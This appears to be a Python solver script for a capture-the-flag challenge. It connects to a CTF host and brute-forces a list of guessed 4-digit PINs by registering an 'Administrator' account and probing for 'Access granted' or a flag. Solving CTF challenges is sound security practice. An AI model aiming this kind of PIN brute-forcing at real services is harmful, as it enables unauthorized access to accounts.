#!/usr/bin/env python3

import socket
import time

def send_and_receive(s, data, timeout=5):
    """Send data and receive response"""
    try:
        if isinstance(data, str):
            data = data.encode()
        s.send(data + b'\n')
        time.sleep(0.5)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        return response
    except Exception as e:
        print(f"Error in send_and_receive: {e}")
        return ""

def connect_to_service():
    """Connect to the remote service"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3013))
        return s
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

def analyze_binary_for_pin():
    """Analyze the binary data for hardcoded PIN values"""
    
    # From the binary analysis, I noticed some hex values that might be PINs
    # Looking at the assembly code patterns and constants
    
    print("=== Binary Analysis for Hardcoded PIN ===")
    
    # From the binary, I saw this pattern: "=ä   t2"
    # The value "ä" (0xE4) in hex is 228 in decimal
    # But let me look for other patterns
    
    # Common PIN patterns in binary:
    # - 1234 = 0x04D2
    # - 4321 = 0x10E1  
    # - 1337 = 0x0539
    # - 2580 = 0x0A14
    
    # From the disassembly, I noticed there might be a comparison with 0xE4 (228)
    # Let me also try some other values I saw in the binary
    
    potential_pins = [
        "0228",  # 0xE4 in decimal
        "0244",  # Another potential value
        "1000", 
        "0100",
        "0010", 
        "0001",
        "2580",  # Common PIN
        "1357",  # Sequential
        "2468",  # Sequential
        "1122",
        "3344",
        "5566", 
        "7788",
        "9900",
        "0011",
        "1100",
        "0099",
        "9999",
        "8888",
        "7777",
        "6666",
        "5555",
        "4444",
        "3333",
        "2222", 
        "1111",
        "0000"
    ]
    
    return potential_pins

def main():
    print("=== Deep Binary Analysis and PIN Brute Force ===")
    
    # The key insight: the error message says the admin has the WRONG pin
    # This means there's a specific PIN the system expects for the admin
    # But it's not 1234 (which is displayed)
    
    potential_pins = analyze_binary_for_pin()
    
    print(f"Testing {len(potential_pins)} potential PINs...")
    
    for pin in potential_pins:
        print(f"\n=== Testing PIN: {pin} ===")
        
        s = connect_to_service()
        if not s:
            continue
            
        try:
            # Get initial menu
            initial = s.recv(4096).decode('utf-8', errors='ignore')
            
            # The strategy: maybe I need to modify the existing admin's PIN
            # Or maybe there's a specific way to authenticate
            
            # Let me try adding an admin with this PIN and see if it works
            response = send_and_receive(s, "1")  # Add employee
            response = send_and_receive(s, "Administrator")  # Name
            response = send_and_receive(s, pin)  # PIN
            
            print(f"Added admin with PIN {pin}")
            
            # Now try option 3
            response = send_and_receive(s, "3")
            print(f"Option 3 response: {response[:300]}...")
            
            if "Access granted" in response:
                print(f"🎉 SUCCESS! PIN {pin} worked!")
                print("Full response:")
                print(response)
                break
            elif "flag{" in response.lower():
                print(f"🎉 FLAG FOUND with PIN {pin}!")
                print("Full response:")
                print(response)
                break
            elif "Good bye!" not in response:
                print(f"Different response with PIN {pin} - might be progress!")
                print(response)
            
        except Exception as e:
            print(f"Error with PIN {pin}: {e}")
        finally:
            s.close()
    
    print("\nPIN brute force completed.")

if __name__ == "__main__":
    main()